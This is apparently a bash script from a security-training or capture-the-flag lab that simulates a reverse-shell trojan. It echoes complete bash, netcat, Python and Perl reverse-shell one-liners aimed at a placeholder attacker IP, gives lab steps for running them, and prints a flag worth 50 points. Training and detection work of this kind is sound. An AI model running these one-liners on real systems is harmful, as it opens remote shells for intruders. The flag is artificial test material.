#!/bin/bash
# Attack: Reverse Shell Trojan
# MITRE ATT&CK: Command and Control - T1071.001
# Severity: CRITICAL
# Description: Establishes a reverse shell trojan for persistent remote access

set -e
echo "[+] Starting: Reverse Shell Trojan"
echo "[+] MITRE ATT&CK: T1071.001 - Application Layer Protocol: Web Protocols"
echo "[+] Severity: CRITICAL"
echo ""

echo "[*] Step 1: Simulating reverse shell establishment..."
ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="4444"

echo "[*] Target: $ATTACKER_IP:$ATTACKER_PORT"

echo ""
echo "[*] Step 2: Testing network connectivity..."
echo "[*] Checking if attacker host is reachable..."
# Don't actually try to connect, just simulate
echo "[*] Simulating: bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"

echo ""
echo "[*] Step 3: Alternative reverse shell methods..."
echo "[*] Method 1 - Bash TCP:"
echo "    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"

echo "[*] Method 2 - Netcat:"
echo "    nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT"

echo "[*] Method 3 - Python:"
echo "    python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ATTACKER_IP\",$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

echo "[*] Method 4 - Perl:"
echo "    perl -e 'use Socket;\$i=\"$ATTACKER_IP\";\$p=$ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'"

echo ""
echo "[*] Step 4: Simulating command execution from attacker..."
echo "[*] Commands that would be available to attacker:"
echo "    $ whoami"
echo "    $(whoami)"
echo "    $ uname -a"
echo "    $(uname -a)"
echo "    $ id"
echo "    $(id)"

echo ""
echo "[✓] Reverse shell simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Establish interactive shell to attacker"
echo "    - Allow full remote command execution"
echo "    - Bypass firewall egress rules"
echo "    - Maintain persistent access"
echo ""
echo "[!] To test this in your lab:"
echo "    1. On attacker machine: nc -lvnp 4444"
echo "    2. Modify ATTACKER_IP variable"
echo "    3. Run the actual reverse shell command"
echo ""
echo "🚩 FLAG CAPTURED!"
echo "════════════════════════════════════════════════════════════════"
echo ""
echo "  FLAG{netcat_listener_detected_instantly}"
echo ""
echo "  Copy this flag and submit it to earn 50 points!"
echo "════════════════════════════════════════════════════════════════"
